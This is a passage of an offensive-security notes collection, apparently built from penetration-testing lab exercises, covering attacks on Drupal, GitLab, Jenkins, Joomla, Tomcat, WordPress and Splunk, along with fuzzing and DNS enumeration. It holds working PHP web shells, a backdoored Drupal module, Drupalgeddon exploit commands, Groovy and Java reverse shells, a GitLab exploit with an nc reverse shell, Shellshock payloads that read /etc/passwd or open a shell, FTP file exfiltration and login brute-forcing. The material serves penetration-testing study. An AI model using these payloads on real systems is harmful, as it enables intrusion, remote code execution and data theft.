--write\n</code></pre>"},{"location":"zNew/TransferFiles/Windows/#powershell-upload-file","title":"PowerShell Upload File","text":"<pre><code>PS &gt; (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')\n</code></pre>"},{"location":"zNew/TransferFiles/Windows/#create-a-command-file-for-the-ftp-client-to-upload-a-file","title":"Create a Command File for the FTP Client to Upload a File","text":"<pre><code>C:\\home&gt; echo open 192.168.49.128 &gt; ftpcommand.txt\nC:\\home&gt; echo USER anonymous &gt;&gt; ftpcommand.txt\nC:\\home&gt; echo binary &gt;&gt; ftpcommand.txt\nC:\\home&gt; echo PUT c:\\windows\\system32\\drivers\\etc\\hosts &gt;&gt; ftpcommand.txt\nC:\\home&gt; echo bye &gt;&gt; ftpcommand.txt\nC:\\home&gt; ftp -v -n -s:ftpcommand.txt\nftp&gt; open 192.168.49.128\n\nLog in with USER and PASS first.\n\n\nftp&gt; USER anonymous\nftp&gt; PUT c:\\windows\\system32\\drivers\\etc\\hosts\nftp&gt; bye\n</code></pre>"},{"location":"zNew/Web/Checklist/","title":"Checklist","text":"<p>Checklist</p>"},{"location":"zNew/Web/Checklist/#fileupload","title":"FileUpload","text":"<ul> <li>Fuzz allowed extensions </li> <li>Fuzz allowed content-type<ul> <li>if xml try to read source code</li> <li>if gif  </li> </ul> </li> </ul>"},{"location":"zNew/Web/Checklist/#ci","title":"CI","text":""},{"location":"zNew/Web/Applications/Drupal/","title":"Discovery/Footprinting","text":"<pre><code>$ curl -s http://drupal.inlanefreight.local | grep Drupal\n</code></pre> <p>Another way to identify Drupal CMS is through nodes. Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form /node/."},{"location":"zNew/Web/Applications/Drupal/#enumeration","title":"Enumeration","text":"<pre><code>$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 \"\"\n$ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt\n\n$ droopescan scan drupal -u http://drupal.inlanefreight.local\n</code></pre>"},{"location":"zNew/Web/Applications/Drupal/#attacking-drupal","title":"Attacking Drupal","text":""},{"location":"zNew/Web/Applications/Drupal/#leveraging-the-php-filter-module","title":"Leveraging the PHP Filter Module","text":"<p>In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which \"Allows embedded PHP code/snippets to be evaluated.</p> <p>From here, we could tick the check box next to the module and scroll down to Save configuration. Next, we could go to Content --&gt; Add content and create a Basic page.</p> <p>We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common cmd to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard system($_GET['cmd']); we open up ourselves up to a \"drive-by\" attacker potentially coming across our web shell.</p> <pre><code>&lt;?php\nsystem($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);\n?&gt;\n</code></pre> <p>We also want to make sure to set Text format drop-down to PHP code. After clicking save, we will be redirected to the new page, in this example http://drupal-qa.inlanefreight.local/node/3. Once saved, we can either request execute commands in the browser by appending ?dcfdd5e021a869fcc6dfaef8bf31377e=id to the end of the URL to run the id command or use cURL on the command line. From here, we could use a bash one-liner to obtain reverse shell access.</p> <pre><code>$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d\"&gt;\"\n</code></pre> <p>From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves.</p> <pre><code>$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz\n</code></pre> <p>Once downloaded go to Administration &gt; Reports &gt; Available updates.</p> <p>From here, click on Browse, select the file from the directory we downloaded it to, and then click Install.</p> <p>Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.</p> <p>With either of these examples, we should keep our client apprised and obtain permission before making these sorts of changes. Also, once we are done, we should remove or disable the PHP Filter module and delete any pages that we created to gain remote code executio</p>"},{"location":"zNew/Web/Applications/Drupal/#uploading-a-backdoored-module","title":"Uploading a Backdoored Module","text":"<p>Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as CAPTCHA. Scroll down and copy the link for the tar.gz archive.</p> <p>Download the archive and extract its contents.</p> <pre><code>$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz\n$ tar xvf captcha-8.x-1.2.tar.gz\n</code></pre> <p>Create a PHP web shell.</p> <p>Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.</p> <pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\n&lt;/IfModule&gt;\n</code></pre> <pre><code>$ mv shell.php .htaccess captcha\n$ tar cvf captcha.tar.gz captcha/\n</code></pre> <p>Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install.</p> <p>Once the installation succeeds, browse to /modules/captcha/shell.php to execute commands.</p> <pre><code>$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id\n</code></pre>"},{"location":"zNew/Web/Applications/Drupal/#leveraging-known-vulnerabilities","title":"Leveraging Known Vulnerabilities","text":"<p>Over the years, Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed Drupalgeddon. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence.</p> <ul> <li> <p>CVE-2014-3704, known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.</p> </li> <li> <p>CVE-2018-7600, also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.</p> </li> <li> <p>CVE-2018-7602, also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.</p> </li> </ul>"},{"location":"zNew/Web/Applications/Drupal/#drupalgeddon","title":"Drupalgeddon","text":"<p>As stated previously, this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this PoC script. Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution.</p> <pre><code>$ python2.7 drupalgeddon.py \n\n#  supply the target URL and a username and password for our new admin account\n$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd\n</code></pre> <p>We could also use the exploit/multi/http/drupal_drupageddon Metasploit module to exploit this.</p>"},{"location":"zNew/Web/Applications/Drupal/#drupalgeddon2","title":"Drupalgeddon2","text":"<p>We can use this PoC to confirm this vulnerability. </p> <pre><code>$ python3 drupalgeddon2.py \n\n# We can check quickly with cURL and see that the hello.txt file was indeed uploaded.\n$ curl -s http://drupal-dev.inlanefreight.local/hello.txt\n\n$ echo '&lt;?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?&gt;' | base64\n\n$ echo \"PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K\" | base64 -d | tee mrb3n.php\n\n$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id\n</code></pre>"},{"location":"zNew/Web/Applications/Drupal/#drupalgeddon3","title":"Drupalgeddon3","text":"<p>Drupalgeddon3 is an authenticated remote code execution vulnerability that affects multiple versions of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.</p> <p>Once we have the session cookie, we can set up the exploit module as follows.</p> <pre><code>msf6 exploit(multi/http/drupal_drupageddon3) &gt; set rhosts 10.129.42.195\nmsf6 exploit(multi/http/drupal_drupageddon3) &gt; set VHOST drupal-acc.inlanefreight.local   \nmsf6 exploit(multi/http/drupal_drupageddon3) &gt; set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y\nmsf6 exploit(multi/http/drupal_drupageddon3) &gt; set DRUPAL_NODE 1\nmsf6 exploit(multi/http/drupal_drupageddon3) &gt; set LHOST 10.10.14.15\nmsf6 exploit(multi/http/drupal_drupageddon3) &gt; show options \n</code></pre>"},{"location":"zNew/Web/Applications/Gitlab/","title":"Footprinting &amp; Discovery","text":"<p>We can quickly determine that GitLab is in use in an environment by just browsing to the GitLab URL, and we will be directed to the login page, which displays the GitLab logo.</p> <p>The only way to footprint the GitLab version number in use is by browsing to the /help page when logged in. If the GitLab instance allows us to register an account, we can log in and browse to this page to confirm the version.</p>"},{"location":"zNew/Web/Applications/Gitlab/#enumeration","title":"Enumeration","text":"<p>There's not much we can do against GitLab without knowing the version number or being logged in.  The first thing we should try is browsing to /explore and see if there are any public projects that may contain something interesting. </p>"},{"location":"zNew/Web/Applications/Gitlab/#attacking-gitlab","title":"Attacking GitLab","text":""},{"location":"zNew/Web/Applications/Gitlab/#username-enumeration","title":"Username Enumeration","text":"<p>We can write one ourselves in Bash or Python or use this one to enumerate a list of valid users. The Python3 version of this same tool can be found here.</p> <pre><code>$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt\n</code></pre>"},{"location":"zNew/Web/Applications/Gitlab/#authenticated-remote-code-execution","title":"Authenticated Remote Code Execution","text":"<p>GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution vulnerability due to an issue with ExifTool handling metadata in uploaded image files. We can use this exploit to achieve RCE.</p> <p>As this is authenticated remote code execution, we first need a valid username and password. In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack. However, if we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack.</p> <pre><code>$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.15 8443 &gt;/tmp/f'\n</code></pre>"},{"location":"zNew/Web/Applications/Jenkins/","title":"Discovery/Footprinting","text":""},{"location":"zNew/Web/Applications/Jenkins/#attacking-jenkins","title":"Attacking Jenkins","text":""},{"location":"zNew/Web/Applications/Jenkins/#script-console","title":"Script Console","text":"<p>/script. This console allows a user to run Apache Groovy scripts</p> <pre><code>def cmd = 'id'\ndef sout = new StringBuffer(), serr = new StringBuffer()\ndef proc = cmd.execute()\nproc.consumeProcessOutput(sout, serr)\nproc.waitForOrKill(1000)\nprintln sout\n</code></pre> <pre><code>r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])\np.waitFor()\n</code></pre> <p>Java reverse shell to gain command execution on a Windows host</p> <pre><code>String host=\"localhost\";\nint port=8044;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre>"},{"location":"zNew/Web/Applications/Joomla/","title":"Discovery/Footprinting","text":"<pre><code>$ curl -s http://dev.inlanefreight.local/ | grep Joomla\n$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -\n</code></pre>"},{"location":"zNew/Web/Applications/Joomla/#enumeration","title":"Enumeration","text":"<pre><code>$ sudo pip3 install droopescan\n$ droopescan scan joomla --url http://dev.inlanefreight.local/\n</code></pre> <p>The default administrator account on Joomla installs is admin, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use this script to attempt to brute force the login.</p> <pre><code>$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin\n</code></pre>"},{"location":"zNew/Web/Applications/Joomla/#attacking-joomla","title":"Attacking Joomla","text":""},{"location":"zNew/Web/Applications/Joomla/#abusing-built-in-functionality","title":"Abusing Built-In Functionality","text":"<p>Once logged in, we can see many options available to us. For our purposes, we would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template.</p> <p>From here, we can click on Templates on the bottom left under Configuration to pull up the templates menu.</p> <p>Next, we can click on a template name. Let's choose protostar under the Template column header. This will bring us to the Templates: Customise page.</p> <p>Finally, we can click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a \"drive-by\" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.</p> <p>Let's choose the error.php page. We'll add a PHP one-liner to gain code execution as follows.</p> <p>system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);</p> <p>Once this is in, click on Save &amp; Close at the top and confirm code execution using cURL.</p> <p>curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id</p>"},{"location":"zNew/Web/Applications/PRTGNetworkMonitor/","title":"Discovery/Footprinting/Enumeration","text":"<p>We can quickly discover PRTG from an Nmap scan. It can typically be found on common web ports such as 80, 443, or 8080. It is possible to change the web interface port in the Setup section when logged in as an admin.</p>"},{"location":"zNew/Web/Applications/Splunk/","title":"Discovery/Footprinting","text":"<p>We can discover Splunk with a quick Nmap service scan. Here we can see that Nmap identified the Splunkd httpd service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API.</p>"},{"location":"zNew/Web/Applications/Splunk/#enumeration","title":"Enumeration","text":"<p>https://:/en-US/app/launcher/home <p>Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining remote code execution on a Splunk server is through the use of a scripted input. These are designed to help integrate Splunk with data sources such as APIs or file servers that require custom methods to access. Scripted inputs are intended to run these scripts, with STDOUT provided as input to Splunk.</p> <p>As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script. We'll cover this in the next section.</p> <p>Aside from this built-in functionality, Splunk has suffered from various public vulnerabilities over the years, such as this SSRF that could be used to gain unauthorized access to the Splunk REST API. At the time of writing, Splunk has 47 CVEs. If we perform a vulnerability scan against Splunk during a penetration test, we will often see many non-exploitable vulnerabilities returned. This is why it is important to understand how to abuse built-in functionality.</p>"},{"location":"zNew/Web/Applications/Splunk/#attacking-splunk","title":"Attacking Splunk","text":"<p>We can use this Splunk package to assist us. The bin directory in this repo has examples for Python and PowerShell. Let's walk through this step-by-step. </p> <pre><code>$ tar -cvzf updater.tar.gz splunk_shell/\n</code></pre> <p>The next step is to choose Install app from file and upload the application.</p>"},{"location":"zNew/Web/Applications/Tomcat/","title":"Discovery/Footprinting","text":"<p>Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version. Here we can see that Tomcat version 9.0.30 is in use.</p> <pre><code>$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat \n</code></pre> <p>This is the default documentation page, which may not be removed by administrators. Here is the general folder structure of a Tomcat installation.</p> <p>The bin folder stores scripts and binaries needed to start and run a Tomcat server. The conf folder stores various configuration files used by Tomcat. The tomcat-users.xml file stores user credentials and their assigned roles. The lib folder holds the various JAR files needed for the correct functioning of Tomcat. The logs and temp folders store temporary log files. The webapps folder is the default webroot of Tomcat and hosts all the applications. The work folder acts as a cache and is used to store data during runtime.</p> <p>Each folder inside webapps The most important file among these is WEB-INF/web.xml, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the WEB-INF/classes folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website. The lib folder stores the libraries needed by that particular application. The jsp folder stores Jakarta Server Pages (JSP), formerly known as JavaServer Pages, which can be compared to PHP files on an Apache server</p>"},{"location":"zNew/Web/Applications/Tomcat/#enumeration","title":"Enumeration","text":"<pre><code>$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \n</code></pre>"},{"location":"zNew/Web/Applications/Tomcat/#attacking-tomcat","title":"Attacking Tomcat","text":"<p>If we can access the /manager or /host-manager endpoints, we can likely achieve remote code execution on the Tomcat server. We can use the auxiliary/scanner/http/tomcat_mgr_login Metasploit module for these purposes</p>"},{"location":"zNew/Web/Applications/Tomcat/#login-brute-force","title":"Login Brute Force","text":"<pre><code>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set VHOST web01.inlanefreight.local\nmsf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set RPORT 8180\nmsf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set stop_on_success true\nmsf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set rhosts 10.129.201.58\n</code></pre>"},{"location":"zNew/Web/Applications/Tomcat/#manager-war-file-upload","title":"Manager - WAR File Upload","text":"<p>The manager web app allows us to instantly deploy new applications by uploading WAR files.</p> <p>/opt/tomcat/apache-tomcat-10.0.10/webapps</p> <p>We could deploy WAR webshell or WAR reverse shell.</p>"},{"location":"zNew/Web/Applications/Tomcat/#cgi","title":"CGI","text":"<p>CVE-2019-0232 is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the enableCmdLineArguments feature enabled. An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system. Versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 of Tomcat are affected.</p> <pre><code>$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd\n$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat\n\nhttp://10.129.204.227:8080/cgi/welcome.bat?&amp;dir\nc%3A%5Cwindows%5Csystem32%5Cwhoami.exe\n</code></pre>"},{"location":"zNew/Web/Applications/WordPress/","title":"Discovery/Footprinting","text":"<p>A quick way to identify a WordPress site is by browsing to the /robots.txt</p>"},{"location":"zNew/Web/Applications/WordPress/#enumeration","title":"Enumeration","text":"<p>Viewing the page with cURL and grepping for WordPress can help us confirm that WordPress is in use and footprint the version number, which we should note down for later.</p> <pre><code>$ curl -s http://blog.inlanefreight.local | grep WordPress\n$ curl -s http://blog.inlanefreight.local/ | grep themes\n$ curl -s http://blog.inlanefreight.local/ | grep plugins\n</code></pre> <p>Checking the page source of another page</p>"},{"location":"zNew/Web/Applications/WordPress/#enumerating-users","title":"Enumerating Users","text":"<p>We can do some manual enumeration of users as well. As mentioned earlier, the default WordPress login page can be found at /wp-login.php.</p> <p>A valid username and an invalid password results in the following message: <code>Error: The password you entered for the username &lt;username&gt; is incorrect. Lost your password?</code></p> <p>However, an invalid username returns that the user was not found. <code>The username &lt;username&gt; is not registered on this site. If you are unsure of your username, try your email address instead.</code></p>"},{"location":"zNew/Web/Applications/WordPress/#wpscan","title":"WPScan","text":"<p>WPScan is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a blog are outdated or vulnerable </p> <p>WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from WPVulnDB, which is used by WPScan to scan for PoC and reports. The free plan allows up to 75 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the --api-token parameter.</p> <pre><code>$ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB&lt;SNIP&gt;\n</code></pre>"},{"location":"zNew/Web/Applications/WordPress/#attacking","title":"Attacking","text":""},{"location":"zNew/Web/Applications/WordPress/#login-bruteforce","title":"Login Bruteforce","text":"<p>WPScan can be used to brute force usernames and passwords. The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. The wp-login method will attempt to brute force the standard WordPress login page, while the xmlrpc method uses WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it\u2019s faster.</p> <pre><code>$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local\n</code></pre>"},{"location":"zNew/Web/Applications/osTicket/","title":"Footprinting/Discovery/Enumeration","text":""},{"location":"zNew/Web/Applications/Attacks/CGIShellshock/","title":"CGI Attacks","text":"<p>Perhaps the most well-known CGI attack is exploiting the Shellshock (aka, \"Bash bug\") vulnerability via CGI. The Shellshock vulnerability (CVE-2014-6271) was discovered in 2014, is relatively simple to exploit, and can still be found in the wild (during penetration tests) from time to time. It is a security flaw in the Bash shell (GNU Bash up until version 4.3) that can be used to execute unintentional commands using environment variables.</p> <pre><code>$ ffuf -u http://10.129.205.27/cgi-bin/FUZZ.cgi -w /usr/share/wordlists/dirb/small.txt\n\n# Cat /etc/passwd \n$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi\n\n# Reverse Shell\n$ curl -H 'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.38/7777 0&gt;&amp;1' http://10.129.204.231/cgi-bin/access.cgi\n</code></pre>"},{"location":"zNew/Web/Fuzzing/Ffuf/","title":"Ffuf","text":""},{"location":"zNew/Web/Fuzzing/Ffuf/#delete","title":"delete","text":""},{"location":"zNew/Web/Fuzzing/Ffuf/#directory-fuzzing","title":"Directory Fuzzing","text":"<pre><code>$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://&lt;URL&gt;:&lt;PORT&gt;/FUZZ\n</code></pre>"},{"location":"zNew/Web/Fuzzing/Ffuf/#extension-fuzzing","title":"Extension Fuzzing","text":"<pre><code>$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt -u http://&lt;URL&gt;:&lt;PORT&gt;/indexFUZZ\n</code></pre>"},{"location":"zNew/Web/Fuzzing/Ffuf/#page-fuzzing","title":"Page Fuzzing","text":"<p>We will now use the same extension found previous.</p> <pre><code>$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://&lt;URL&gt;:&lt;PORT&gt;/FUZZ.php\n</code></pre>"},{"location":"zNew/Web/Fuzzing/Ffuf/#recursive-scanning","title":"Recursive Scanning","text":"<pre><code>$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://&lt;URL&gt;:&lt;PORT&gt;/FUZZ -recursion -recursion-depth 1 -e .php -v\n</code></pre>"},{"location":"zNew/Web/Fuzzing/Ffuf/#parameters","title":"Parameters","text":""},{"location":"zNew/Web/Fuzzing/Ffuf/#get","title":"GET","text":"<pre><code>$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://&lt;URL&gt;:&lt;PORT&gt;/index.php?FUZZ=key -fs xxx\n</code></pre>"},{"location":"zNew/Web/Fuzzing/Ffuf/#post","title":"POST","text":"<p><code>Tip: In PHP, \"POST\" data \"content-type\" can only accept \"application/x-www-form-urlencoded\". So, we can set that in \"ffuf\" with \"-H 'Content-Type: application/x-www-form-urlencoded'\".</code></p> <pre><code>$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://&lt;URL&gt;:&lt;PORT&gt;/index.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx\n</code></pre> <p>We can send a POST request with curl</p> <pre><code>$ curl http://&lt;URL&gt;:&lt;PORT&gt;/index.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'\n</code></pre>"},{"location":"zNew/Web/Fuzzing/Ffuf/#value","title":"Value","text":"<p>After fuzzing a working parameter, we now have to fuzz the correct value.   </p> <pre><code>$ ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx\n</code></pre>"},{"location":"zNew/Web/Fuzzing/Ffuf/#sub-domain-fuzzing","title":"Sub-domain Fuzzing","text":"<p>Add to /etc/hosts</p> <pre><code>$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.&lt;IP/ADDRESS&gt;:&lt;PORT&gt;/\n</code></pre>"},{"location":"zNew/Web/Fuzzing/Ffuf/#vhosts-fuzzing","title":"Vhosts Fuzzing","text":"<pre><code>$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://&lt;IP/ADDRESS&gt;:&lt;PORT&gt;/ -H 'Host: FUZZ.&lt;IP/ADDRESS&gt;'\n</code></pre>"},{"location":"zNew/Web/Fuzzing/Ffuf/#filtering-results","title":"Filtering Results","text":"<pre><code>$ ffuf -h\n</code></pre>"},{"location":"zNew/Web/InformationGathering/ActiveInformationGathering/","title":"ActiveInformationGathering","text":""},{"location":"zNew/Web/InformationGathering/ActiveInformationGathering/#vhosts","title":"Vhosts","text":""},{"location":"zNew/Web/InformationGathering/ActiveInformationGathering/#vhost-fuzzing","title":"vHost Fuzzing","text":"<p><code>cat ./vhosts | while read vhost;do echo \"\\n********\\nFUZZING: ${vhost}\\n********\";curl -s -I http://192.168.10.10 -H \"HOST: ${vhost}.randomtarget.com\" | grep \"Content-Length: \";done</code></p> <p><code>curl -s http://192.168.10.10 -H \"Host: dev-admin.randomtarget.com\"</code></p>"},{"location":"zNew/Web/InformationGathering/ActiveInformationGathering/#automating-virtual-hosts-discovery","title":"Automating Virtual Hosts Discovery","text":"<p><code>ffuf -w ./vhosts -u http://192.168.10.10 -H \"HOST: FUZZ.randomtarget.com\" -fs 612</code></p> <p>where:</p> <pre><code>-w: Path to our wordlist\n-u: URL we want to fuzz\n-H \"HOST: FUZZ.randomtarget.com\": This is the HOST Header, and the word FUZZ will be used as the fuzzing point.\n-fs 612: Filter responses with a size of 612, default response size in this case.\n</code></pre>"},{"location":"zNew/Web/InformationGathering/ActiveInformationGathering/#crawling","title":"Crawling","text":""},{"location":"zNew/Web/InformationGathering/ActiveInformationGathering/#ffuf","title":"FFuF","text":"<p><code>ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt</code></p> <pre><code>cewl -m5 --lowercase -w wordlist.txt http://192.168.10.10\n</code></pre> <pre><code>-w: We separate the wordlists by coma and add an alias to them to inject them as fuzzing points later\n-u: Our target URL with the fuzzing points.\n</code></pre> <p><code>ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://192.168.10.10/FOLDERS/WORDLISTEXTENSIONS</code></p>"},{"location":"zNew/Web/InformationGathering/WebInformationGathering/","title":"WebInformationGathering","text":""},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#delete","title":"delete","text":""},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#whois","title":"WHOIS","text":"<pre><code>$ whois $TARGET\n</code></pre>"},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#dns","title":"DNS","text":""},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#nslookup-dig","title":"Nslookup &amp; DIG","text":""},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#querying-a-records","title":"Querying: A Records","text":"<p><code>nslookup $TARGET</code></p> <p><code>dig facebook.com @1.1.1.1</code></p>"},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#querying-a-records-for-a-subdomain","title":"Querying: A Records for a Subdomain","text":"<p><code>nslookup -query=A $TARGET</code></p> <p><code>dig a www.facebook.com @1.1.1.1</code></p>"},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#querying-ptr-records-for-an-ip-address","title":"Querying: PTR Records for an IP Address","text":"<p><code>nslookup -query=PTR 31.13.92.36</code></p> <p><code>dig -x 31.13.92.36 @1.1.1.1</code></p>"},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#querying-any-existing-records","title":"Querying: ANY Existing Records","text":"<p><code>nslookup -query=ANY $TARGET</code></p> <p><code>dig any google.com @8.8.8.8</code></p> <p><code>dig any cloudflare.com @8.8.8.8</code></p>"},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#querying-txt-records","title":"Querying: TXT Records","text":"<p><code>COR33@htb[/htb]$ nslookup -query=TXT $TARGET</code></p> <p><code>dig txt facebook.com @1.1.1.1</code></p>"},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#querying-mx-records","title":"Querying: MX Records","text":"<p><code>nslookup -query=MX $TARGET</code></p> <p><code>dig mx facebook.com @1.1.1.1</code></p>"},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#nslookup","title":"Nslookup","text":"<p><code>nslookup 